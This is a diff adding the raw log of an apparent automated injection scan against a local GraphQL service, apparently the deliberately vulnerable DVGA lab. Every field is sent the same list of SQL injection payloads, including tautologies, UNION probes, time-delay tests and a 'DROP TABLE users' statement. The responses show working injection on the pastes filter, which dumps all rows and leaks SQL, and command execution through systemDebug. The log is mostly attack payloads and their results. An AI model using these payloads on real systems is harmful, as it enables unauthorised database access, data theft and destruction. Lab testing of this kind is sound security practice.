@@ -1,0 +1,386 @@
+[+] Introspecting http://localhost:5013/graphql
+
+[>] Testing pastes (string args: ['filter'])
+
+
+	Payload:  '
+	Query: query { pastes(filter: " '") { id title } }
+	Response: {"errors":[{"message":"(sqlite3.OperationalError) near \"''\": syntax error\n[SQL: SELECT pastes.id AS pastes_id, pastes.title AS pastes_title, pastes.content AS pastes_content, pastes.public AS pastes_public, pastes.user_agent AS pastes_user_agent, pastes.ip_addr AS pastes_ip_addr, pastes.owner_id AS pastes_owner_id, pastes.burn AS pastes_burn \nFROM pastes \nWHERE pastes.public = 0 AND pastes.burn = 0 AND title = ' '' or content = ' '' ORDER BY pastes.id DESC\n LIMIT ? OFFSET ?]\n[parameters: (1000, 0)]\n(Background on this error at: http://sqlalche.me/e/13/e3q8)"}],"data":{"pastes":null}}
+
+
+	Payload: ' OR '1'='1
+	Query: query { pastes(filter: "' OR '1'='1") { id title } }
+	Response: {"data":{"pastes":[{"id":"12","title":"TITLE!!!!!"},{"id":"11","title":"TITLE!!!!!"},{"id":"10","title":"Testing Testing"},{"id":"9","title":"This is my first paste"},{"id":"8","title":"TITLE!!!!!"},{"id":"7","title":"This is my first paste"},{"id":"6","title":"What is this even"},{"id":"5","title":"What is this even"},{"id":"4","title":"This is my first paste"},{"id":"3","title":"Testing Testing"},{"id":"2","title":"555-555-1337"},{"id":"1","title":"Testing Testing"}]}}
+
+
+	Payload: ' OR 1=1--
+	Query: query { pastes(filter: "' OR 1=1--") { id title } }
+	Response: {"data":{"pastes":[{"id":"1","title":"Testing Testing"},{"id":"2","title":"555-555-1337"},{"id":"3","title":"Testing Testing"},{"id":"4","title":"This is my first paste"},{"id":"5","title":"What is this even"},{"id":"6","title":"What is this even"},{"id":"7","title":"This is my first paste"},{"id":"8","title":"TITLE!!!!!"},{"id":"9","title":"This is my first paste"},{"id":"10","title":"Testing Testing"},{"id":"11","title":"TITLE!!!!!"},{"id":"12","title":"TITLE!!!!!"}]}}
+
+
+	Payload: ' OR 'a'='a
+	Query: query { pastes(filter: "' OR 'a'='a") { id title } }
+	Response: {"data":{"pastes":[{"id":"12","title":"TITLE!!!!!"},{"id":"11","title":"TITLE!!!!!"},{"id":"10","title":"Testing Testing"},{"id":"9","title":"This is my first paste"},{"id":"8","title":"TITLE!!!!!"},{"id":"7","title":"This is my first paste"},{"id":"6","title":"What is this even"},{"id":"5","title":"What is this even"},{"id":"4","title":"This is my first paste"},{"id":"3","title":"Testing Testing"},{"id":"2","title":"555-555-1337"},{"id":"1","title":"Testing Testing"}]}}
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { pastes(filter: "' UNION SELECT NULL--") { id title } }
+	Response: {"errors":[{"message":"(sqlite3.OperationalError) SELECTs to the left and right of UNION do not have the same number of result columns\n[SQL: SELECT pastes.id AS pastes_id, pastes.title AS pastes_title, pastes.content AS pastes_content, pastes.public AS pastes_public, pastes.user_agent AS pastes_user_agent, pastes.ip_addr AS pastes_ip_addr, pastes.owner_id AS pastes_owner_id, pastes.burn AS pastes_burn \nFROM pastes \nWHERE pastes.public = 0 AND pastes.burn = 0 AND title = '' UNION SELECT NULL--' or content = '' UNION SELECT NULL--' ORDER BY pastes.id DESC\n LIMIT ? OFFSET ?]\n[parameters: (1000, 0)]\n(Background on this error at: http://sqlalche.me/e/13/e3q8)"}],"data":{"pastes":null}}
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { pastes(filter: "'; DROP TABLE users; --") { id title } }
+	Response: {"errors":[{"message":"You can only execute one statement at a time."}],"data":{"pastes":null}}
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { pastes(filter: "' AND 1=0 UNION SELECT NULL,NULL--") { id title } }
+	Response: {"errors":[{"message":"(sqlite3.OperationalError) SELECTs to the left and right of UNION do not have the same number of result columns\n[SQL: SELECT pastes.id AS pastes_id, pastes.title AS pastes_title, pastes.content AS pastes_content, pastes.public AS pastes_public, pastes.user_agent AS pastes_user_agent, pastes.ip_addr AS pastes_ip_addr, pastes.owner_id AS pastes_owner_id, pastes.burn AS pastes_burn \nFROM pastes \nWHERE pastes.public = 0 AND pastes.burn = 0 AND title = '' AND 1=0 UNION SELECT NULL,NULL--' or content = '' AND 1=0 UNION SELECT NULL,NULL--' ORDER BY pastes.id DESC\n LIMIT ? OFFSET ?]\n[parameters: (1000, 0)]\n(Background on this error at: http://sqlalche.me/e/13/e3q8)"}],"data":{"pastes":null}}
+
+
+	Payload: ') OR ('1'='1
+	Query: query { pastes(filter: "') OR ('1'='1") { id title } }
+	Response: {"errors":[{"message":"(sqlite3.OperationalError) near \")\": syntax error\n[SQL: SELECT pastes.id AS pastes_id, pastes.title AS pastes_title, pastes.content AS pastes_content, pastes.public AS pastes_public, pastes.user_agent AS pastes_user_agent, pastes.ip_addr AS pastes_ip_addr, pastes.owner_id AS pastes_owner_id, pastes.burn AS pastes_burn \nFROM pastes \nWHERE pastes.public = 0 AND pastes.burn = 0 AND title = '') OR ('1'='1' or content = '') OR ('1'='1' ORDER BY pastes.id DESC\n LIMIT ? OFFSET ?]\n[parameters: (1000, 0)]\n(Background on this error at: http://sqlalche.me/e/13/e3q8)"}],"data":{"pastes":null}}
+
+
+	Payload: admin' --
+	Query: query { pastes(filter: "admin' --") { id title } }
+	Response: {"data":{"pastes":[]}}
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { pastes(filter: "' OR sleep(5)--") { id title } }
+	Response: {"errors":[{"message":"(sqlite3.OperationalError) no such function: sleep\n[SQL: SELECT pastes.id AS pastes_id, pastes.title AS pastes_title, pastes.content AS pastes_content, pastes.public AS pastes_public, pastes.user_agent AS pastes_user_agent, pastes.ip_addr AS pastes_ip_addr, pastes.owner_id AS pastes_owner_id, pastes.burn AS pastes_burn \nFROM pastes \nWHERE pastes.public = 0 AND pastes.burn = 0 AND title = '' OR sleep(5)--' or content = '' OR sleep(5)--' ORDER BY pastes.id DESC\n LIMIT ? OFFSET ?]\n[parameters: (1000, 0)]\n(Background on this error at: http://sqlalche.me/e/13/e3q8)"}],"data":{"pastes":null}}
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { pastes(filter: "' AND sleep(5)--") { id title } }
+	Response: {"errors":[{"message":"(sqlite3.OperationalError) no such function: sleep\n[SQL: SELECT pastes.id AS pastes_id, pastes.title AS pastes_title, pastes.content AS pastes_content, pastes.public AS pastes_public, pastes.user_agent AS pastes_user_agent, pastes.ip_addr AS pastes_ip_addr, pastes.owner_id AS pastes_owner_id, pastes.burn AS pastes_burn \nFROM pastes \nWHERE pastes.public = 0 AND pastes.burn = 0 AND title = '' AND sleep(5)--' or content = '' AND sleep(5)--' ORDER BY pastes.id DESC\n LIMIT ? OFFSET ?]\n[parameters: (1000, 0)]\n(Background on this error at: http://sqlalche.me/e/13/e3q8)"}],"data":{"pastes":null}}
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { pastes(filter: "' WAITFOR DELAY '0:0:5'--") { id title } }
+	Response: {"errors":[{"message":"(sqlite3.OperationalError) near \"WAITFOR\": syntax error\n[SQL: SELECT pastes.id AS pastes_id, pastes.title AS pastes_title, pastes.content AS pastes_content, pastes.public AS pastes_public, pastes.user_agent AS pastes_user_agent, pastes.ip_addr AS pastes_ip_addr, pastes.owner_id AS pastes_owner_id, pastes.burn AS pastes_burn \nFROM pastes \nWHERE pastes.public = 0 AND pastes.burn = 0 AND title = '' WAITFOR DELAY '0:0:5'--' or content = '' WAITFOR DELAY '0:0:5'--' ORDER BY pastes.id DESC\n LIMIT ? OFFSET ?]\n[parameters: (1000, 0)]\n(Background on this error at: http://sqlalche.me/e/13/e3q8)"}],"data":{"pastes":null}}
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { pastes(filter: "' OR 'x'='x' /*") { id title } }
+	Response: {"errors":[{"message":"(sqlite3.ProgrammingError) Incorrect number of bindings supplied. The current statement uses 0, and there are 2 supplied.\n[SQL: SELECT pastes.id AS pastes_id, pastes.title AS pastes_title, pastes.content AS pastes_content, pastes.public AS pastes_public, pastes.user_agent AS pastes_user_agent, pastes.ip_addr AS pastes_ip_addr, pastes.owner_id AS pastes_owner_id, pastes.burn AS pastes_burn \nFROM pastes \nWHERE pastes.public = 0 AND pastes.burn = 0 AND title = '' OR 'x'='x' /*' or content = '' OR 'x'='x' /*' ORDER BY pastes.id DESC\n LIMIT ? OFFSET ?]\n[parameters: (1000, 0)]\n(Background on this error at: http://sqlalche.me/e/13/f405)"}],"data":{"pastes":null}}
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { pastes(filter: "' OR EXISTS(SELECT * FROM users)--") { id title } }
+	Response: {"data":{"pastes":[{"id":"1","title":"Testing Testing"},{"id":"2","title":"555-555-1337"},{"id":"3","title":"Testing Testing"},{"id":"4","title":"This is my first paste"},{"id":"5","title":"What is this even"},{"id":"6","title":"What is this even"},{"id":"7","title":"This is my first paste"},{"id":"8","title":"TITLE!!!!!"},{"id":"9","title":"This is my first paste"},{"id":"10","title":"Testing Testing"},{"id":"11","title":"TITLE!!!!!"},{"id":"12","title":"TITLE!!!!!"}]}}
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { pastes(filter: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { id title } }
+	Response: {"errors":[{"message":"(sqlite3.OperationalError) no such table: tablename\n[SQL: SELECT pastes.id AS pastes_id, pastes.title AS pastes_title, pastes.content AS pastes_content, pastes.public AS pastes_public, pastes.user_agent AS pastes_user_agent, pastes.ip_addr AS pastes_ip_addr, pastes.owner_id AS pastes_owner_id, pastes.burn AS pastes_burn \nFROM pastes \nWHERE pastes.public = 0 AND pastes.burn = 0 AND title = '' AND 1=(SELECT COUNT(*) FROM tablename)--' or content = '' AND 1=(SELECT COUNT(*) FROM tablename)--' ORDER BY pastes.id DESC\n LIMIT ? OFFSET ?]\n[parameters: (1000, 0)]\n(Background on this error at: http://sqlalche.me/e/13/e3q8)"}],"data":{"pastes":null}}
+
+[>] Testing paste (string args: ['title'])
+
+
+	Payload:  '
+	Query: query { paste(title: " '") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: ' OR '1'='1
+	Query: query { paste(title: "' OR '1'='1") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: ' OR 1=1--
+	Query: query { paste(title: "' OR 1=1--") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: ' OR 'a'='a
+	Query: query { paste(title: "' OR 'a'='a") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { paste(title: "' UNION SELECT NULL--") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { paste(title: "'; DROP TABLE users; --") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { paste(title: "' AND 1=0 UNION SELECT NULL,NULL--") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: ') OR ('1'='1
+	Query: query { paste(title: "') OR ('1'='1") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: admin' --
+	Query: query { paste(title: "admin' --") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { paste(title: "' OR sleep(5)--") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { paste(title: "' AND sleep(5)--") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { paste(title: "' WAITFOR DELAY '0:0:5'--") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { paste(title: "' OR 'x'='x' /*") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { paste(title: "' OR EXISTS(SELECT * FROM users)--") { id title } }
+	Response: {"data":{"paste":null}}
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { paste(title: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { id title } }
+	Response: {"data":{"paste":null}}
+
+[>] Testing systemDiagnostics (string args: ['username', 'password', 'cmd'])
+
+
+	Payload:  '
+	Query: query { systemDiagnostics(username: " '", password: " '", cmd: " '") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: ' OR '1'='1
+	Query: query { systemDiagnostics(username: "' OR '1'='1", password: "' OR '1'='1", cmd: "' OR '1'='1") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: ' OR 1=1--
+	Query: query { systemDiagnostics(username: "' OR 1=1--", password: "' OR 1=1--", cmd: "' OR 1=1--") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: ' OR 'a'='a
+	Query: query { systemDiagnostics(username: "' OR 'a'='a", password: "' OR 'a'='a", cmd: "' OR 'a'='a") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { systemDiagnostics(username: "' UNION SELECT NULL--", password: "' UNION SELECT NULL--", cmd: "' UNION SELECT NULL--") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { systemDiagnostics(username: "'; DROP TABLE users; --", password: "'; DROP TABLE users; --", cmd: "'; DROP TABLE users; --") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { systemDiagnostics(username: "' AND 1=0 UNION SELECT NULL,NULL--", password: "' AND 1=0 UNION SELECT NULL,NULL--", cmd: "' AND 1=0 UNION SELECT NULL,NULL--") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: ') OR ('1'='1
+	Query: query { systemDiagnostics(username: "') OR ('1'='1", password: "') OR ('1'='1", cmd: "') OR ('1'='1") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: admin' --
+	Query: query { systemDiagnostics(username: "admin' --", password: "admin' --", cmd: "admin' --") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { systemDiagnostics(username: "' OR sleep(5)--", password: "' OR sleep(5)--", cmd: "' OR sleep(5)--") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { systemDiagnostics(username: "' AND sleep(5)--", password: "' AND sleep(5)--", cmd: "' AND sleep(5)--") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { systemDiagnostics(username: "' WAITFOR DELAY '0:0:5'--", password: "' WAITFOR DELAY '0:0:5'--", cmd: "' WAITFOR DELAY '0:0:5'--") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { systemDiagnostics(username: "' OR 'x'='x' /*", password: "' OR 'x'='x' /*", cmd: "' OR 'x'='x' /*") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { systemDiagnostics(username: "' OR EXISTS(SELECT * FROM users)--", password: "' OR EXISTS(SELECT * FROM users)--", cmd: "' OR EXISTS(SELECT * FROM users)--") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { systemDiagnostics(username: "' AND 1=(SELECT COUNT(*) FROM tablename)--", password: "' AND 1=(SELECT COUNT(*) FROM tablename)--", cmd: "' AND 1=(SELECT COUNT(*) FROM tablename)--") }
+	Response: {"data":{"systemDiagnostics":"Username is invalid"}}
+
+[>] Testing systemDebug (string args: ['arg'])
+
+
+	Payload:  '
+	Query: query { systemDebug(arg: " '") }
+	Response: {"data":{"systemDebug":""}}
+
+
+	Payload: ' OR '1'='1
+	Query: query { systemDebug(arg: "' OR '1'='1") }
+	Response: {"data":{"systemDebug":"PID   USER     TIME  COMMAND\n    1 dvga      0:03 python app.py\n   27 dvga      0:00 ps  OR 1=1\n"}}
+
+
+	Payload: ' OR 1=1--
+	Query: query { systemDebug(arg: "' OR 1=1--") }
+	Response: {"data":{"systemDebug":""}}
+
+
+	Payload: ' OR 'a'='a
+	Query: query { systemDebug(arg: "' OR 'a'='a") }
+	Response: {"data":{"systemDebug":"PID   USER     TIME  COMMAND\n    1 dvga      0:03 python app.py\n   29 dvga      0:00 ps  OR a=a\n"}}
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { systemDebug(arg: "' UNION SELECT NULL--") }
+	Response: {"data":{"systemDebug":""}}
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { systemDebug(arg: "'; DROP TABLE users; --") }
+	Response: {"data":{"systemDebug":""}}
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { systemDebug(arg: "' AND 1=0 UNION SELECT NULL,NULL--") }
+	Response: {"data":{"systemDebug":""}}
+
+
+	Payload: ') OR ('1'='1
+	Query: query { systemDebug(arg: "') OR ('1'='1") }
+	Response: {"data":{"systemDebug":"PID   USER     TIME  COMMAND\n    1 dvga      0:03 python app.py\n   33 dvga      0:00 ps ) OR (1=1\n"}}
+
+
+	Payload: admin' --
+	Query: query { systemDebug(arg: "admin' --") }
+	Response: {"data":{"systemDebug":""}}
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { systemDebug(arg: "' OR sleep(5)--") }
+	Response: {"data":{"systemDebug":""}}
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { systemDebug(arg: "' AND sleep(5)--") }
+	Response: {"data":{"systemDebug":""}}
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { systemDebug(arg: "' WAITFOR DELAY '0:0:5'--") }
+	Response: {"data":{"systemDebug":""}}
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { systemDebug(arg: "' OR 'x'='x' /*") }
+	Response: {"data":{"systemDebug":""}}
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { systemDebug(arg: "' OR EXISTS(SELECT * FROM users)--") }
+	Response: {"data":{"systemDebug":""}}
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { systemDebug(arg: "' AND 1=(SELECT COUNT(*) FROM tablename)--") }
+	Response: {"data":{"systemDebug":""}}
+
+[>] Testing me (string args: ['token'])
+
+
+	Payload:  '
+	Query: query { me(token: " '") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: ' OR '1'='1
+	Query: query { me(token: "' OR '1'='1") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: ' OR 1=1--
+	Query: query { me(token: "' OR 1=1--") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: ' OR 'a'='a
+	Query: query { me(token: "' OR 'a'='a") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { me(token: "' UNION SELECT NULL--") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { me(token: "'; DROP TABLE users; --") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { me(token: "' AND 1=0 UNION SELECT NULL,NULL--") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: ') OR ('1'='1
+	Query: query { me(token: "') OR ('1'='1") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: admin' --
+	Query: query { me(token: "admin' --") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { me(token: "' OR sleep(5)--") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { me(token: "' AND sleep(5)--") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { me(token: "' WAITFOR DELAY '0:0:5'--") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { me(token: "' OR 'x'='x' /*") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { me(token: "' OR EXISTS(SELECT * FROM users)--") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { me(token: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { id username } }
+	Response: {"errors":[{"message":"Not enough segments","locations":[{"line":1,"column":9}],"path":["me"]}],"data":{"me":null}}
